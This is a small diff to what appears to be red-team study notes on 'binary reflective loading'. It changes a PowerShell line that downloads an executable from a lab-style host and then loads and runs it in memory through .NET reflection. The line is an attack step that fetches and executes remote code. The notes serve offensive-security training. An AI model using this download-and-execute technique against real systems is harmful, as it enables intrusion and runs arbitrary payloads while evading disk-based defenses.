@@ -13,7 +13,7 @@ tags: [C# CRTO REDTEAMING]
 Binary reflective loading
 
 ```csharp
-$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/binary.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [rev.Program]::Main("".Split())
 ```
